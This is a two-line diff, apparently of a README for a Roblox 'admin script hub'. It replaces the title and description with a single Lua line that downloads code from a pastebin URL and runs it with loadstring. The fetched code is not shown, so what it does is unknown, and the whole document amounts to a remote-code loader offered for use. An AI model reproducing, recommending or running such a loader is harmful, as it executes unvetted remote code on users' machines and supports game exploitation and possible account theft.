@@ -1,2 +1,1 @@
-# OwneradminReall-sab-hub
-Owneradminreall sab script
+loadstring(game:HttpGet("https://pastebin.com/raw/xhtdzUpn"))()
